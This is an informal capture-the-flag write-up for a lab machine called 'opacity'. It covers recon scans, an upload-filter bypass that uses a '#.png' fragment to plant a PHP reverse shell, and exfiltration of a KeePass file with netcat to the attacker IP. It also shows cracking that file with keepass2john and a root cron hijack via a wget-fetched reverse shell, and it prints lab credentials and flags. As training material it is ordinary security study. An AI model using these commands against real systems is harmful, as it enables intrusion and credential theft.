# writeups

=== nmap recon ===
```
22/tcp   open     ssh         syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa4rFv9bD2hlJ8EgxU6clOj6v7GMUIjfAr7fzckrKGPnvxQA3ikvRKouMMUiYThvvfM7gOORL5sicN3qHS8cmRsLFjQVGyNL6/nb+MyfUJlUYk4WGJYXekoP5CLhwGqH/yKDXzdm1g8LR6afYw8fSehE7FM9AvXMXqvj+/WoC209pWu/s5uy31nBDYYfRP8VG3YEJqMTBgYQIk1RD+Q6qZya1RQDnQx6qLy1jkbrgRU9mnfhizLVsqZyXuoEYdnpGn9ogXi5A0McDmJF3hh0p01+KF2/+GbKjJrGNylgYtU1/W+WAoFSPE41VF7NSXbDRba0WIH5RmS0MDDFTy9tbKB33sG9Ct6bHbpZCFnxBi3toM3oBKYVDfbpbDJr9/zEI1R9ToU7t+RH6V0zrljb/cONTQCANYxESHWVD+zH/yZGO4RwDCou/ytSYCrnjZ6jHjJ9TWVkRpVjR7VAV8BnsS6egCYBOJqybxW2moY86PJLBVkd6r7x4nm19yX4AQPm8=
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqe7rEbmvlsedJwYaZCIdligUJewXWs8mOjEKjVrrY/28XqW/RMZ12+4wJRL3mTaVJ/ftI6Tu9uMbgHs21itQQ=
|   256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSFcnxA8EchrkX6O0RPMOjIUZyyyQT9fM4z4DdCZyA
80/tcp   open     http        syn-ack     Apache httpd 2.4.41 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp  open     netbios-ssn syn-ack     Samba smbd 4.6.2
445/tcp  open     netbios-ssn syn-ack     Samba smbd 4.6.2
1812/tcp filtered radius      no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 12s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22700/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 53441/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55554/udp): CLEAN (Failed to receive data)
|   Check 4 (port 40535/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   OPACITY<00>          Flags: <unique><active>
|   OPACITY<03>          Flags: <unique><active>
|   OPACITY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-08T21:57:23
|_  start_date: N/A
```

==dir listin===
```
/.php                 (Status: 403) [Size: 276]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 848]
/.html                (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.1.176/css/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/cloud                (Status: 301) [Size: 310] [--> http://10.10.1.176/cloud/]
```


`http://10.10.1.176/cloud/`, space to upload an external image, I passed a .pthml and .php
it doesn't work but when I pass a .png that works fine so why not test a double extension
like .php.png, 1st I started my listing server and host 
```
image.png 
image.php
image.php.png
```
after I uploaded `image.png`,
`http://10.8.91.36:8000/php-reverse.png` : request
`10.10.1.176 - - [08/Apr/2023 19:04:36] "GET /php-reverse.png HTTP/1.1" 200 -` : response
in my machine

I have to say I use burpsuite to inspect request, so keep that in mind, so in burpsuite
I edited the request, it was like that
```
url=http%3A%2F%2F10.8.91.36%3A8000%2Fphp-reverse.png
```
so I changed it to 
```
http%3a%2f%2f10.8.91.36%3a8000%2fphp-reverse.php%23.png
```
so uploaded with success then I back the page where to upload and make another request
but copying the change I did, so now I'm gonna pass again the change
`http://10.8.91.36:8000/php-reverse.php#.png` and boom the shell

so the `#` means pass everything after it like comment, we now that by seeing what the
website show us after the upload set

```
<a href="http://10.10.1.176/cloud/images/php-reverse.php#.png">
<img src="http://10.10.1.176/cloud/images/php-reverse.php#.png" alt="background" border="0" /></a>
```
and also my listenning server finish like that
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.1.176 - - [08/Apr/2023 19:04:36] "GET /php-reverse.png HTTP/1.1" 200 -
10.10.1.176 - - [08/Apr/2023 19:10:34] "GET /php-reverse.php HTTP/1.1" 200 -
10.10.1.176 - - [08/Apr/2023 19:15:12] "GET /php-reverse.php HTTP/1.1" 200 -
```

so in the machine, I went to /home/sysadmin to read local.txt but my bad
permission denied, so I tried to check a little some important dirs, and I found
a datab**.kdbx in the /opt , and again this script it for sysadmin I supposed we can't
get anything without pass by this user, so I came back to the /home and I see
a /scripts dir but nothing serious then I go to /var/www/html and I remembered
on the 80 port there was a login page that I couldn't connected so I read his source code
and I found

```
cat login.php
<?php session_start(); /* Starts the session */

        /* Check Login form submitted */
        if(isset($_POST['Submit'])){
                /* Define username and associated password array */
                $logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');
```
it's like a flat db, important, I can use it to login in the webpage and maybe found
smthing interesting, I checked but nothing.

thereis a .ssh but permission denied

cameback to the file in /opt we can uploaded it to my machine and read it, so let's try

```
target box

nc 10.8.91.36 8889 < dataset.kdbx

attacker box

nc -lvnp 8889 > dataset.kdbx

```
after the file upload the command `file data..kdbx` told me it's a keepass database so I look in 
google and I found keeppass2john, I use this tool and got the master password to unlock this db
`741852963        (dataset) ` so after I download keepassXC and unlock the db where I found

```
user : sysadmin
password : Cl0udP4ss40p4city#8700

```
so now we can jump right into the ssh, and before that here the flag `6661b61b44d234d230d06bf5b3c075e2`(local.txt)
and let's look for the 2nd but I have an idea how to caught it, I suppose you too.


so by inspecting service/processes running in the box there are one, interesting 
and this one run a file that we know, I did that with `pspy64`
`2023/04/09 00:11:01 CMD: UID=0     PID=3225   | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php `

so right now it try to overpass this
```
sysadmin@opacity:~/scripts$ chmod 777 lib
sysadmin@opacity:~/scripts$ chown sysadmin:sysadmin lib/
```
i entered these 2 commands and here we go for another shell, let's see
```
sysadmin@opacity:~/scripts/lib$ wget http://10.8.91.36:9090/php-reverse.php
--2023-04-09 00:21:18--  http://10.8.91.36:9090/php-reverse.php
Connecting to 10.8.91.36:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5679 (5.5K) [application/octet-stream]
Saving to: ‘php-reverse.php’

php-reverse.php               100%[==============================================>]   5.55K  --.-KB/s    in 0.02s   

2023-04-09 00:21:19 (269 KB/s) - ‘php-reverse.php’ saved [5679/5679]

sysadmin@opacity:~/scripts/lib$ rm -rf ./*
sysadmin@opacity:~/scripts/lib$ ls
sysadmin@opacity:~/scripts/lib$ wget http://10.8.91.36:9090/php-reverse.php
--2023-04-09 00:21:30--  http://10.8.91.36:9090/php-reverse.php
Connecting to 10.8.91.36:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5679 (5.5K) [application/octet-stream]
Saving to: ‘php-reverse.php’

php-reverse.php               100%[==============================================>]   5.55K  --.-KB/s    in 0.001s  

2023-04-09 00:21:30 (7.38 MB/s) - ‘php-reverse.php’ saved [5679/5679]

sysadmin@opacity:~/scripts/lib$ ls
php-reverse.php
sysadmin@opacity:~/scripts/lib$ mv php-reverse.php backup.inc.php


# cat proof.txt
ac0d56f93202dd57dcb2498c739fd20e
```

END

https://www.youtube.com/watch?v=B9wue1PrdeM
